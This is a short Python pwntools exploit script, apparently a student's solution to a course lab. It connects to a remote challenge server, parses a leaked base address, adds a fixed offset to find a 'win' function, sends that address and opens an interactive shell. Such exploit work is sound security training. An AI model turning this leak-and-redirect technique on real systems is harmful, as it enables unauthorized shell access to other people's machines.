import pwn

if __name__ == "__main__":

    # Similar to Lab1-2, Lab1-3 has a "win" function which provides shell access.
    # It also provides a base address to STDOUT at time of execution.
    # The goal is to use this base address to calculate the "win" address quickly.
    
    # I start by running the process.
    process_to_exploit = pwn.remote("csc748.hostbin.org", 7013)
    # This next line can replace the one above for testing against a local binary.
    # process_to_exploit = pwn.process("./lab1-3.bin")

    # I read a line from STDOUT until the hexadecimal prefix is reached.
    # This information is not useful, so it is dropped.
    debug_useless_info = process_to_exploit.recvuntil(b"0x")

    # I read in the base address.
    base_address_as_hex = process_to_exploit.recvuntil(b".", True)

    # I read the rest of the STDOUT.
    # This is also not useful, so it is dropped as well.
    debug_useless_info = process_to_exploit.recvlines(2)

    # The offset from the base address to "win" is +5130 (decimal).
    # I convert the hex address to decimal and add the offset.
    base_address_as_dec = int(base_address_as_hex, 16)
    win_address_as_dec = base_address_as_dec + 5130

    # I convert the address to a string and encode it as bytes.
    win_address_in_bytes = str(win_address_as_dec).encode()

    # I send the address back to the victim process.
    process_to_exploit.sendline(win_address_in_bytes)

    # I drop to a shell.
    process_to_exploit.interactive()